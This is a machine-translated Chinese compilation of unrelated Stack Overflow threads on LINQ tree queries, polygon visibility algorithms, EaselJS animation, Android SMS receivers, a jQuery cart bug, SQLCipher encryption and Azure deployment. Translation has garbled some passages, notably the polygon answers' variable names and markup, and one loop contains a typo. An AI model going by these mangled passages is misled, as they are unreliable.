INSERT dbo.TestTree (ParentID, Code) VALUES (null, 'bla')
INSERT dbo.TestTree (ParentID, Code) VALUES (1, 'blu')
INSERT dbo.TestTree (ParentID, Code) VALUES (2, 'blo')
INSERT dbo.TestTree (ParentID, Code) VALUES (null, 'baz')
INSERT dbo.TestTree (ParentID, Code) VALUES (1, 'foo')
INSERT dbo.TestTree (ParentID, Code) VALUES (2, 'bar') 
```

我的测试中的所有示例都返回了 ID 为 3 的“baz”实体。假设该实体确实存在。错误处理超出了本文的范围。

**更新**

为了解决@Bazzz 的评论，带有路径的数据如下所示。代码在级别上是唯一的，而不是全局唯一的。

```
ID   ParentID    Code      TreePath
---- ----------- --------- -------------------
1    NULL        foo       foo
4    NULL        bla       bla
7    NULL        baz       baz
2    1           bar       foo/bar
5    1           blu       foo/blu
8    1           foo       foo/foo
3    2           baz       foo/bar/baz
6    2           blo       foo/bar/blo
9    2           bar       foo/bar/bar 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-17T11:40:18.067

诀窍是反过来做，并建立以下查询：

```
from entity in dataContext.Entities
where entity.Code == "baz"
where entity.Parent.Code == "bar"
where entity.Parent.Parent.Code == "foo"
where entity.Parent.Parent.ParentID == 0
select entity; 
```

有点幼稚（硬编码）的解决方案是这样的：

```
var pathParts = path.Split('/').ToList();

var entities = 
    from entity in dataContext.Entities 
    select entity;

pathParts.Reverse();

for (int index = 0; index < pathParts.Count+ index++)
{
    string pathPart = pathParts[index];

    switch (index)
    {
        case 0:
            entities = entities.Where(
                entity.Code == pathPart);
            break;
        case 1:
            entities = entities.Where(
                entity.Parent.Code == pathPart);
            break;
        case 2:
            entities = entities.Where(entity.Parent.Parent.Code == pathPart);
            break;
        case 3:
            entities = entities.Where(
                entity.Parent.Parent.Parent.Code == pathPart);
            break;
        default:
            throw new NotSupportedException();
    }
} 
```

通过构建表达式树动态地执行此操作并非易事，但可以通过仔细查看 C# 编译器生成的内容来完成（例如使用 ILDasm 或 Reflector）。这是一个例子：

```
private static Entity GetEntityByPath(DataContext dataContext, string path)
{
    List<string> pathParts = path.Split(new char[] { '/' }).ToList<string>();
    pathParts.Reverse();

    var entities =
        from entity in dataContext.Entities
        select entity;

    // Build up a template expression that will be used to create the real expressions with.
    Expression<Func<Entity, bool>> templateExpression = entity => entity.Code == "dummy";
    var equals = (BinaryExpression)templateExpression.Body;
    var property = (MemberExpression)equals.Left;

    ParameterExpression entityParameter = Expression.Parameter(typeof(Entity), "entity");

    for (int index = 0; index < pathParts.Count; index++)
    {
        string pathPart = pathParts[index];

        var entityFilterExpression =
            Expression.Lambda<Func<Entity, bool>>(
                Expression.Equal(
                    Expression.Property(
                        BuildParentPropertiesExpression(index, entityParameter),
                        (MethodInfo)property.Member),
                    Expression.Constant(pathPart),
                    equals.IsLiftedToNull,
                    equals.Method),
                templateExpression.Parameters);

        entities = entities.Where<Entity>(entityFilterExpression);

        // TODO: The entity.Parent.Parent.ParentID == 0 part is missing here.
    }

    return entities.Single<Entity>();
}

private static Expression BuildParentPropertiesExpression(int numberOfParents, ParameterExpression entityParameter)
{
    if (numberOfParents == 0)
    {
        return entityParameter;
    }

    var getParentMethod = typeof(Entity).GetProperty("Parent").GetGetMethod();

    var property = Expression.Property(entityParameter, getParentMethod);

    for (int count = 2; count <= numberOfParents; count++)
    {
        property = Expression.Property(property, getParentMethod);
    }

    return property;
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-27T01:53:51.527

您需要一个递归函数而不是循环。像这样的东西应该可以完成这项工作：

```
public EntityTable Single(string path)
{
    List<string> pathParts = path.Split('/').ToList();
    string code = pathParts.Last();

    var entities = dataContext.EntityTables.Where(e => e.Code == code);

    pathParts.RemoveAt(pathParts.Count - 1);
    return GetRecursively(entities, pathParts);
}

private EntityTable GetRecursively(IQueryable<EntityTable> entity, List<string> pathParts)
{
    if (!(entity == null || pathParts.Count == 0))
    {
        string code = pathParts.Last();

        if (pathParts.Count == 1)
        {
            return entity.Where(x => x.EntityTable1.Code == code && x.ParentId == x.Id).FirstOrDefault();
        }
        else
        {                    
            pathParts.RemoveAt(pathParts.Count - 1);

            return this.GetRecursively(entity.Where(x => x.EntityTable1.Code == code), pathParts);
        }
    }
    else
    {
        return null;
    }
} 
```

如您所见，我只是返回最终的父节点。如果您想获取所有 EntityTable 对象的列表，那么我将使用递归方法返回找到的节点的 Id 列表，最后 - 在 Single(...) 方法中 - 运行一个简单的 LINQ 查询以获取使用此 ID 列表的 IQueryable 对象。

**编辑：** 我试图完成您的任务，但我认为存在一个根本问题：在某些情况下您无法识别单一路径。例如，您有两个路径“foo/bar/baz”和“foo/bar/baz/bak”，其中“baz”实体不同。如果您要寻找路径“foo/bar/baz”，那么您总是会找到两个匹配的路径（一个是四实体路径的一部分）。虽然你可以正确地得到你的“baz”实体，但这太令人困惑了，我会重新设计这个：要么放置一个唯一的约束，以便每个实体只能使用一次，要么将完整路径存储在“代码”列中。****

# algorithm - 一种线性时间算法，用于查找从其他顶点可见的多边形的任何顶点

> ID：13429856
> 
> 赞同：7
> 
> 时间：2012-11-17T10:54:17.573
> 
> 标签：algorithm, geometry, computational-geometry

假设有一个没有孔和由`n`顶点定义的自相交的多边形（即简单多边形）。选择这个多边形的一个反射顶点`v`。

我想找到`u`从 vertex 中“可见”的同一多边形的任何其他顶点`v`。`v`可见我的意思是，在多边形之间和`u`完全位于多边形内部的线段。

`O(N)`有没有一种算法可以及时或更好地做到这一点？有没有一种算法可以及时找到所有可见的顶点`O(N)`？

一项快速研究表明，对于给定的多边形和该多边形内的任何点，[都](http://en.wikipedia.org/wiki/Visibility_polygon)可以在`O(N)`. 我认为找到一个可见的顶点应该更容易。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-21T02:08:59.497

这个问题在 30 年前就解决了：

> ElGindy 和 Avis，“从一个点计算可见性多边形的线性算法”，*J. 算法* **2，1981**年，p。186--197。

Joe & Simpson 在 1985 年发表了一篇非常好的论文，“Visibility of a simple polygon from a point”，提供了经过仔细验证的伪代码：（[PDF 下载链接](https://cs.uwaterloo.ca/research/tr/1985/CS-85-38.pdf)）。从那以后，这肯定已经用多种语言实现了很多次。例如，在[Wikipedia 文章中有一个关于该主题](http://en.wikipedia.org/wiki/Visibility_polygon)的链接。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-20T00:15:04.403

我修改了算法，因为它不正确。我希望这次它涵盖所有情况！

从反射*a*开始，让*a'*下一个顶点并跟随多边形，直到找到一条与*a--a'*相交的边*a'*，让*b成为该边与线**a--a*的交点*'*和*c*边缘的终点（*a--c*右侧的那个）。

现在继续穿过多边形的边，如果边从左到右穿过线段*a--b ，则将**b*设置为新的交点，将*c*设置为结束顶点。当你完成时，我们有一个三角形*a--b--c*。现在再次从*c*开始查看每个顶点，看看它是否在三角形*a--b--c*内，在这种情况下，将*c*设置为新顶点。最后*a--c*是多边形的对角线。

这是 C 中的一个实现，它假设反射点*a*在 中`P[0]`：

```
struct pt {
    double x,y;
    friend pt operator+(pt a, pt b){a.x+=b.x; a.y+=b.y; return a;}
    friend pt operator-(pt a, pt b){a.x-=b.x; a.y-=b.y; return a;}
    friend pt operator*(pt a, double k){a.x*=k; a.y*=k; return a;}
    bool leftof(pt a, pt b) const{
        // returns true if the *this point is left of the segment a--b.
        return (b.x-a.x)*(y-a.y) - (x-a.x)*(b.y-a.y) > 0;
    }
};
pt intersect(pt a, pt b, pt c, pt d){// (see O'rourke p.222)
    double s,t, denom;
    denom = (a.x-b.x)*(d.y-c.y)+ (d.x-c.x)*(b.y-a.y);
    s = ( a.x*(d.y-c.y)+c.x*(a.y-d.y)+d.x*(c.y-a.y) )/denom;
    return a + (b-a)*s;
}
/**
    P is a polygon, P[0] is a reflex (the inside angle at P[0] is > pi).
    finds a vertex t such that P[0]--P[t] is a diagonal of the polygon.
**/
int diagonal( vector<pt> P ){
    pt a = P[0], b = P[1]; //alias
    int j=2;
    if( !b.leftof(a,P[j]) ){
        // find first edge cutting a--b to the right of b
        for(int k = j+1; k+1 < int(P.size()); ++k)
            if( P[k].leftof(a,b) && P[k+1].leftof(b,a) && b.leftof(P[k+1],P[k]) )
                j = k,
                b = intersect( a,b,P[k],P[k+1] );
        // find nearest edge cutting the segment a--b 
        for(int k = j+1; k+1 < int(P.size()); ++k)
            if( P[k].leftof(a,b) && P[k+1].leftof(b,a) &&
                a.leftof(P[k+1],P[k]) && b.leftof(P[k],P[k+1]) ){
                b = intersect( a,b,P[k],P[k+1] );
                j = k+1;
            }
    }
    for(int k = j+1; k+1 < int(P.size()); ++k)
        if( P[k].leftof(a,b) && P[k].leftof(b,P[j]) && P[k].leftof(P[j],a) )
            j = k;
    return j;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-17T11:02:22.823

**您可以在O(n)**时间内测试任何单个顶点，从而在**O(n^2)**中测试所有顶点。要测试是否有任何单个顶点**U从****V**可见，请在**V**和**U**之间构建线。让我们称这条线**为 L**。现在，测试**L**以查看它是否与任何多边形边相交。如果不是，则**U***不会被***V**遮挡。如果是，则**U** *被*遮挡。

此外，您可以测试**L**是否位于多边形内，如下所示：假设**V**上的入射边是**E1**和**E2**。计算**E1**和**E2**之间（称为**a1**）和**E1**和**L**之间（称为**a2**）的有符号角。**a2**的符号应与**a1**相同（即**L**与**E2在****E1**的“同一”侧），并且**a2**应小于**a1**（即**L** '在' **E2之前************）。**********

 ******小心你的相交测试，因为**L**将与入射到**V**的多边形边相交。您可以忽略这些交叉点。

此外，如果**U共享与****V**相关的任何边，则**U从****V**中很容易看到。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-17T11:33:51.393

您可以使用多边形的三角剖分。

假设您有一个 triangulation ，则可以通过检查三角剖分中的相关内部边来找到顶点的`T`一组可见顶点。具体来说，如果遍历连接到的三角形集合并识别出内部边（出现两次的那些！），则该集合是除 之外的所有边顶点。`U``V``V``U``V`

请注意，这不一定是来自 的*所有*可见顶点`V`，只是一个带有`|U| >= 0` ~~(必须是来自 V 的至少一个内部边)~~的集合。不过它是有效的——只有访问的三角形/边的数量`O(m)`在哪里`m`，这本质上是`O(1)`为了合理的输入。

当然，您需要先建立一个三角测量。有一些有效的算法允许内置约束 Delaunay 三角剖分`O(n*log(n))`，但这并不完全`O(n)`。可以在[Triangle](http://www.cs.cmu.edu/~quake/triangle.html)和[CGAL](http://www.cgal.org/)中找到良好的约束 Delaunay 实现。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-18T07:01:41.613

只需继续通过以 V 开头的顶点并更新可见顶点列表即可。如果我没有错过任何东西，那将是 O(n)。

为简单起见，我们称 V 可见。

我已经尝试了一天用文字来表达，失败并使用了伪代码:)

```
visible_vertices = {V}
for each next segment in counter-clockwise polygon traversal
  if segment is counter-clockwise (looking from V)
    if (visible_vertices.last -> segment.end) is counter-clockwise
      visible_vertices.add(segment.end)
  else
    while segment hides visible_vertices.last or segment.start=visible_vertices.last
      visible_vertices.remove_last 
```******

# javascript - Easeljs - 在 socket.io 和 nodejs 上的平滑动画

> ID：13429857
> 
> 赞同：0
> 
> 时间：2012-11-17T10:54:29.873
> 
> 标签：javascript, node.js, socket.io, easeljs

我正在使用服务器端的 socket.io (nodejs) 和客户端的easeljs 开发一个多人游戏。到目前为止，它真的很简单，您可以在画布元素上移动一个矩形，并将位置更新发送到服务器，并将位置广播给客户端。流量不是问题，因为只有两个用户可以互相对抗，这由 socket.io 中的房间功能处理。绘图和游戏循环是用easeljs实现的。

我遇到的问题是其他玩家的动作不是很流畅。位置更新确实非常快（足以应对碰撞等），但对于通过服务器获得位置更新的玩家来说当然不是那么顺利。

如何平滑动画？目前我正在创建一个新的 Container 类并更新容器的位置，例如

```
myContainer = new MyFigure()
on('positionupdate', function(data) {
    myContainer.x = data.x
    myContainer.y = data.y
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T13:16:06.513

您可以使用补间库。例如[http://www.createjs.com/#!/TweenJS](http://www.createjs.com/#!/TweenJS)。

# android - 广播接收器优先级 - 只接收一个广播 - 短信应用 - ANDROID

> ID：13429858
> 
> 赞同：0
> 
> 时间：2012-11-17T10:54:33.250
> 
> 标签：android, android-intent, sms, broadcastreceiver, intentfilter

我目前正在开发一个短信应用程序，我无法收到短信。我将清单中的优先级更改为

```
<intent-filter android:priority="2147483647" >
      <action android:name="android.provider.Telephony.SMS_RECEIVED" />
</intent-filter> 
```

广播类：

```
public class SMSReceiver extends BroadcastReceiver {

    private final String ACTION_RECEIVE_SMS = "android.provider.Telephony.SMS_RECEIVED";
    private SmsModel newSMS;
    private static final String TAG = "SMSReceiver";

    @Override
        public void onReceive(Context mContext, Intent intent) {

    Log.i("TEST","TEST");

    /**
     *  RECEPTION SMS
     */

    Bundle bundle = intent.getExtras();
    SmsMessage[] msgs = null;

    if (bundle != null) {

        Object[] pdus = (Object[]) bundle.get("pdus");
        msgs = new SmsMessage[pdus.length];

        for (int i = 0; i < pdus.length; i++) {
            msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);

            from = msgs[i].getOriginatingAddress();
            content = msgs[i].getMessageBody().toString();
        }

        Log.d("FIRST BROADCAST RECIEVER", "##### incoming sms from : " + from);

            }

    this.context = context;
    bundle = intent.getExtras();
    if (bundle != null) {
        Object[] pdusObj = (Object[]) bundle.get("pdus");
        SmsMessage[] messages = new SmsMessage[pdusObj.length];

        // getting SMS information from Pdu.
        for (int i = 0; i < pdusObj.length; i++) {
            messages[i] = SmsMessage.createFromPdu((byte[]) pdusObj[i]);
        }

        for (SmsMessage currentMessage : messages) {

            sender = currentMessage.getDisplayOriginatingAddress();
            msg = currentMessage.getDisplayMessageBody();

            Log.d("Sender::",sender);
            Log.d("Msg::",msg); 
        }

    //

    if (intent.getAction().equals(ACTION_RECEIVE_SMS)) {

        // RECUPERE SMS
            bundle = intent.getExtras();
            Object[] pdus = (Object[]) bundle.get("pdus");

            // RECONSTRUIRE SMS
            messages = new SmsMessage[pdus.length];
            for (int i = 0; i < pdus.length; i++) {
                messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
            }

            if (messages.length > -1) {

                // AFFECTE NUM_TEL + MSG + THREAD_ID
                final String messageBody = messages[0].getMessageBody();
                final String phoneNumber = messages[0]
                        .getDisplayOriginatingAddress();
                int thread_id = ConversionFactory.getThreadIDfromNumber(phoneNumber);

                // AJOUT SMS DANS BOITE DE RECEPTION ANDROID + RECUPERATION NOUVEAU ID SMS
                ContentValues values = new ContentValues();
                values.put("address", phoneNumber);
                values.put("body", messageBody);
                Uri uri = mContext.getContentResolver().insert(Uri.parse("content://sms/inbox"), values);

                // SI LA THREAD EXISTE...
                if(thread_id != -1)
                {
                    // CREATION NOUVEAU SMS
                    newSMS = new SmsModel(Integer.parseInt(uri.getLastPathSegment()), thread_id, messageBody, phoneNumber, 0, System.currentTimeMillis(), "receieved");

                    // AJOUTE DANS LA CONVERSATION

                    AllConversations.getInstance().getConversation(thread_id).ListeSms.put(String.valueOf(Integer.parseInt(uri.getLastPathSegment())), newSMS);

                    // SI L'UTILISATEUR EST DANS LA CONVERSATION(ACTIVTY) DU NOUVEAU SMS
                    if(thread_id == ((VariablesService)mContext.getApplicationContext()).mScheduleMessage.getItem(0).getThreadId())
                    {                           
                        // AJOUT DANS LISTVIEW MESSAGE
                        ((VariablesService)mContext.getApplicationContext()).mScheduleMessage.add(newSMS);

                    }
                    for (int i=0; i<((VariablesService)mContext.getApplicationContext()).mScheduleConversation.getCount();i++) {

                        if (((VariablesService)mContext.getApplicationContext()).mScheduleConversation.getItem(i).getThreadId() == thread_id)
                        {
                                ((VariablesService)mContext.getApplicationContext()).mScheduleConversation.remove(((VariablesService)mContext.getApplicationContext()).mScheduleConversation.getItem(i));
                                newSMS.setContactName(mContext, newSMS.getNumber());
                                ((VariablesService)mContext.getApplicationContext()).mScheduleConversation.insert(newSMS, 0);
                                Log.i("ENTRER", ((VariablesService)mContext.getApplicationContext()).mScheduleConversation.getItem(i).getMessage());                                
                        }
                    }

                    // ENVOYER BROADCAST
                    Intent returnintent=new Intent("RECIEVE_INTENT_FROM_BROADCAST");
                    mContext.sendBroadcast(returnintent);

                    Log.i(TAG, newSMS.toString());
                }

                //VIBRATOR
                Vibrator v;
                v=(Vibrator)mContext.getSystemService(Context.VIBRATOR_SERVICE);
                v.vibrate(1000);

} 
```

XML

```
 <receiver
        android:name="com.application.reciever.SMSReceiver"
        class="com.application.reciever.SMSReceiver" android:exported="true">
        <intent-filter android:priority="999" >
            <action android:name="android.provider.Telephony.SMS_RECEIVED" />
        </intent-filter>
    </receiver> 
```

日志猫：

```
11-17 11:49:08.570: I/MESSAGE(25588): Sending SMS !
11-17 11:49:08.590: I/ConversationActivity(25588): SMS Sent.
11-17 11:49:10.820: I/bcsms(25588): 3424 - 46 - tts - +33610030697 - 17-11-2012 - 1353149350823 - receieved
11-17 11:49:10.830: I/BROADCAST(25588): GOT THE INTENT
11-17 11:49:11.570: D/OpenGLRenderer(25588): Flushing caches (mode 1)
11-17 11:49:12.330: W/IInputConnectionWrapper(25588): showStatusIcon on inactive InputConnection
11-17 11:49:14.940: D/dalvikvm(25588): GC_CONCURRENT freed 293K, 8% free 8141K/8775K, paused 2ms+8ms

11-17 11:49:18.670: I/MESSAGE(25588): Sending SMS !
11-17 11:49:18.680: I/ConversationActivity(25588): SMS Sent.
11-17 11:49:21.860: D/OpenGLRenderer(25588): Flushing caches (mode 1)
11-17 11:49:22.120: W/IInputConnectionWrapper(25588): showStatusIcon on inactive InputConnection 
```

如您所见，我没有在接收器中收到第二条短信，有什么想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-27T05:38:50.527

我也在开发基于 SMS 的应用程序......我没有遇到任何问题......它工作得很好。这是清单代码：

```
<receiver android:name=".SMSReceiver" >
        <intent-filter android:priority="1000" >
            <action android:name="android.provider.Telephony.SMS_RECEIVED" />

            <category android:name="android.intent.category.DEFAULT" />
        </intent-filter>
</receiver> 
```

这是在 SMSReceiver.class 文件中工作的一般方法：

```
public void onReceive(Context context, Intent intent) {

    this.context = context;
    Bundle bundle = intent.getExtras();
    if (bundle != null) {
        Object[] pdusObj = (Object[]) bundle.get("pdus");
        SmsMessage[] messages = new SmsMessage[pdusObj.length];

        // getting SMS information from Pdu.
        for (int i = 0; i < pdusObj.length; i++) {
            messages[i] = SmsMessage.createFromPdu((byte[]) pdusObj[i]);
        }

        for (SmsMessage currentMessage : messages) {

            sender = currentMessage.getDisplayOriginatingAddress();
            msg = currentMessage.getDisplayMessageBody();

            Log.d("Sender::",sender);
            Log.d("Msg::",msg);
        }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-04-23T12:49:39.077

优先级值必须是整数。默认值为 0。该值必须大于 -1000 且小于 1000。

将优先级值设置为 999。它将适用于您的代码。它是最高的价值。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-22T13:53:55.510

尝试这个..

在您的 SMS 广播接收器中..

```
@Override
    public void onReceive(final Context context, Intent intent) {

        Bundle bundle = intent.getExtras();
        SmsMessage[] msgs = null;

        if (bundle != null) {

            Object[] pdus = (Object[]) bundle.get("pdus");
            msgs = new SmsMessage[pdus.length];

            for (int i = 0; i < msgs.length; i++) {
                msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);

                from = msgs[i].getOriginatingAddress();
                content = msgs[i].getMessageBody().toString();
            }

            Log.d(Constants.TAG, "##### incoming sms from : " + from);

            smsContent = "SMS received From: " + from + "\n Time: "
                    + Utils.getReadableTime(System.currentTimeMillis())
                    + "\n Content: " + content;
                } 
```

}

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-06-19T11:37:43.773

Sms Go 应用程序始终在后台运行。如果您希望您的应用程序也收到短信，您应该 1- 选择最高优先级 2- 从后台运行的服务中运行广播接收器

# php - php foreach 循环正在做奇怪的行为来添加值

> ID：13429860
> 
> 赞同：1
> 
> 时间：2012-11-17T10:54:39.460
> 
> 标签：php, jquery, jquery-selectors, foreach

我只是在 foreach 循环中获得产品的价值。现在的逻辑是这样的，当我将获得产品数量时，它将被插入到表单的输入区域，并且当单击添加到购物车的按钮时，该产品数量将显示在结帐页面.. foreach 循环内的代码是这样的

```
 ![<div class="cart">
    <table class="discount-prices">
      <tr>
        <?php foreach ($discounts as $discount) { ?>
          <td class="discount-price">
            <?php echo sprintf($text_discount, $discount\['quantity'\], $discount\['price'\]); ?>
          </td>
        </tr>
      </table>
      <div>
        <?php echo $text_qty; ?>
        <input type="text" name="quantity" size="2" value="<?php echo $discount\['quantity'\]; ?>" />
        <input type="hidden" name="product_id" size="2" value="<?php echo $product_id; ?>" />
        &nbsp;<input type="button" value="<?php echo $button_cart; ?>" id="button-cart" class="button" />
     </div>
    <?php } ?>] 
```

为按钮工作的 jQuery 脚本是这样的

```
$('#button-cart').bind('click', function() {
    $.ajax({
        url: 'index.php?route=checkout/cart/add',
        type: 'post',
        data: $('.product-info input[type=\'text\'], .product-info input[type=\'hidden\'], .product-info input[type=\'radio\']:checked, .product-info input[type=\'checkbox\']:checked, .product-info select, .product-info textarea'),
        dataType: 'json',
        success: function(json) {
            $('.success, .warning, .attention, information, .error').remove();

            if (json['error']) {
                if (json['error']['option']) {
                    for (i in json['error']['option']) {
                        $('#option-' + i).after('<span class="error">' + json['error']['option'][i] + '</span>');
                    }
                }
            } 

            if (json['success']) {
                $('#notification').html('<div class="success" style="display: none;">' + json['success'] + '<img src="catalog/view/theme/default/image/close.png" alt="" class="close" /></div>');

                //$('.success').fadeIn('slow');

                $('#cart-total').html(json['total']);

                $('html, body').animate({ scrollTop: 0 }, 'slow'); 
                setTimeout(opencartpage(),1000);
            }   
        }
    });
}); 
```

现在这里的问题是，当我单击第一个添加到购物车按钮时，它会进入结帐页面，但值是 5 而不是 3。您可以在图像（第二张图像）中看到我点击了第一个按钮，其值为“3”，但它采用“5”（最后一个值）。另一个问题是添加到购物车的第一个按钮适用于结帐页面，但另外两个添加到购物车的按钮根本不起作用。当单击其余两个按钮时，没有任何反应。那么有人可以帮助我并告诉我这里有什么问题吗？ ![在此处输入图像描述](../Images/dc3c54f38c9257f64fe8c376f46b6733.png)![在此处输入图像描述](../Images/ab20a7abd4401b3c3f4544cb864b4fa7.png)

**更新**

使用`$('.button-cart')`而不是`$('#button-cart')`使所有按钮处于活动状态意味着当单击该按钮时，它正在处理结帐页面，但它只采用最后一个值 5，这可以在第一张图像中看到。那么如何解决这个问题呢？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T11:05:44.197

不要将 jQuery 事件绑定到 #button-cart，而是使用 .button-cart。CSS 在匹配 id 方面非常轻松（即它仍然会匹配它们全部），但 jQuery 并不那么宽容——它只会将匹配 id 的事件绑定到 DOM 中的一个匹配元素。

此外，ajax 数据看起来正在发送所有 .product-info 元素，而不仅仅是链接到按钮的元素。这是未经测试的，但尝试类似：

```
$('#button-cart').bind('click', function() {
    $self = $(this);
    $.ajax({
        ...
        data: $self.children(...),
        ...
    }); 
```

# objective-c - 为 SQLCipher 问题加密数据库

> ID：13429861
> 
> 赞同：3
> 
> 时间：2012-11-17T10:54:44.387
> 
> 标签：objective-c, ios, sqlite, fmdb, sqlcipher

我在创建新的加密数据库时遇到问题。我已经对此进行了研究，这些是我尝试过的一些解决方案。

使用基于[http://sqlcipher.net/design/的终端](http://sqlcipher.net/design/)

```
sqlite3 sqlcipher.db
sqlite> PRAGMA KEY='test123';
sqlite> CREATE TABLE t1(a,b);
sqlite> INSERT INTO t1(a,b) VALUES ('one for the money', 'two for the show');
sqlite> .quit

~ $ hexdump -C sqlcipher.db 
```

运行 hexdump 仍然给我非加密的数据库文本。

在 ios 中对现有 Db 执行附加方式。

```
- (void)encryptDB
{
    sqlite3 *unencrypted_DB;
    NSString *path_u = [[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) objectAtIndex:0] 
                        stringByAppendingPathComponent:@"unencrypted.db"];

    if (sqlite3_open([path_u UTF8String], &unencrypted_DB) == SQLITE_OK) {
        NSLog(@"Database Opened");
        // Attach empty encrypted database to unencrypted database
        sqlite3_exec(unencrypted_DB, "ATTACH DATABASE 'encrypted.db' AS encrypted KEY '1234';", NULL, NULL, NULL);

        // export database
        sqlite3_exec(unencrypted_DB, "SELECT sqlcipher_export('encrypted');", NULL, NULL, NULL);

        // Detach encrypted database
        sqlite3_exec(unencrypted_DB, "DETACH DATABASE encrypted;", NULL, NULL, NULL);

        NSLog (@"End database copying");
        sqlite3_close(unencrypted_DB);
    }
    else {
        sqlite3_close(unencrypted_DB);
        NSAssert1(NO, @"Failed to open database with message '%s'.", sqlite3_errmsg(unencrypted_DB));
    }
} 
```

上面运行没有问题，但 encrypted.db 没有出现在我的文档文件夹中。

在我的应用程序中设置 ssl 和 sqlcipher 之后。使用这个

```
- (void) openCipherDB
{
    NSString *databasePath = [[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) objectAtIndex:0] 
                              stringByAppendingPathComponent: @"unencrypted.db"];
    NSLog(@"database path %@", databasePath);
    sqlite3 *db;
    if (sqlite3_open([databasePath UTF8String], &db) == SQLITE_OK)
    {
        //sqlite3_exec(_db, "ATTACH DATABASE 'xyz.sqlite' AS encrypted KEY 'test';", NULL, NULL, &t)
        const char* key = [@"secret" UTF8String];
        int sqlite3_key(sqlite3 *db, const void *pKey, int nKey);       //i added this after seeing SO
        sqlite3_key(db, key, strlen(key));
        if (sqlite3_exec(db, (const char*) "SELECT count(*) FROM sqlite_master;", NULL, NULL, NULL) == SQLITE_OK) {
            // password is correct, or, database has been initialized
            NSLog(@"database initialize");
        } 
        else 
        {
            NSLog(@"incorrect pass");
            // incorrect password!
        }

        sqlite3_close(db);
    }
} 
```

它给了我不正确密码的 NSLog，当然我的数据库也没有加密。

我还能做些什么来加密我的数据库？谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-19T14:34:14.703

您遇到的第一个问题是运行 sqlite3 而不是 ./sqlite3。您需要提供到 sqlite3 的 sqlcipher 版本的显式路径，否则您最终将使用作为操作系统一部分安装的路径，它不支持加密。

对于第二个问题，您必须使用 stringByAppendingPathComponent 在附件中提供 encrypted.db 的完整路径（例如，与创建 unencrypted.db 的完整路径相同的方式）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-08-06T10:55:46.817

我也面临附加数据库的第二个问题。我对如何使用 Stephen 提供的解决方案感到困惑，因为我无法弄清楚如何将完整路径提供给 sql 语句，因为它只接受`const char`，最后我想出了下面的代码并且它工作，发布相同这里

.....................

```
NSString *sql1 = [NSString stringWithFormat:@"ATTACH DATABASE '%s' AS encrypted KEY '%s'",[encryptedDBPath UTF8String],"1234" ];
NSLog(@"String is %@", sql1);
sqlite3_exec(unencrypted_DB, [sql1 UTF8String], NULL, NULL, NULL); 
```

.....................................

-anoop

# asp.net-mvc - Azure git 部署-第二个程序集中缺少引用

> ID：13429867
> 
> 赞同：9
> 
> 时间：2012-11-17T10:55:28.610
> 
> 标签：asp.net-mvc, git, deployment, azure, web-deployment

我正在尝试将 Bitbucket 部署设置到 Azure 网站。我成功链接了 Bitbucket 和 Azure，但是当我推送到 Bitbucket 时，我在 Azure 站点上收到以下错误：

![在此处输入图像描述](../Images/bcbff7dd2b5bcd2b53f0db4ba68bcf4f.png)

如果我单击“查看日志”，则会显示以下编译错误：

```
 D:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Common.targets(1578,5): warning MSB3245: Could not resolve this reference. Could not locate the assembly "System.Web.Mvc, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35, processorArchitecture=MSIL". Check to make sure the assembly exists on disk. If this reference is required by your code, you may get compilation errors. [C:\DWASFiles\Sites\<projname>\VirtualDirectory0\site\repository\<projname>.Common\<projname>.Common.csproj]
    D:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Common.targets(1578,5): warning MSB3245: Could not resolve this reference. Could not locate the assembly "WebMatrix.WebData, Version=2.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35, processorArchitecture=MSIL". Check to make sure the assembly exists on disk. If this reference is required by your code, you may get compilation errors. [C:\DWASFiles\Sites\<projname>\VirtualDirectory0\site\repository\<projname>.Common\<projname>.Common.csproj]
    CustomMembershipProvider.cs(5,7): error CS0246: The type or namespace name 'WebMatrix' could not be found (are you missing a using directive or an assembly reference?) [C:\DWASFiles\Sites\<projname>\VirtualDirectory0\site\repository\<projname>.Common\<projname>.Common.csproj]
    CustomMembershipProvider.cs(9,38): error CS0246: The type or namespace name 'ExtendedMembershipProvider' could not be found (are you missing a using directive or an assembly reference?) [C:\DWASFiles\Sites\<projname>\VirtualDirectory0\site\repository\<projname>.Common\<projname>.Common.csproj]
    Models\AccountModels.cs(3,18): error CS0234: The type or namespace name 'Mvc' does not exist in the namespace 'System.Web' (are you missing an assembly reference?) [C:\DWASFiles\Sites\<projname>\VirtualDirectory0\site\repository\<projname>.Common\<projname>.Common.csproj]
    CustomMembershipProvider.cs(198,37): error CS0246: The type or namespace name 'OAuthAccountData' could not be found (are you missing a using directive or an assembly reference?) [C:\DWASFiles\Sites\<projname>\VirtualDirectory0\site\repository\<projname>.Common\<projname>.Common.csproj]
    Models\AccountModels.cs(40,10): error CS0246: The type or namespace name 'Compare' could not be found (are you missing a using directive or an assembly reference?) [C:\DWASFiles\Sites\<projname>\VirtualDirectory0\site\repository\<projname>.Common\<projname>.Common.csproj]
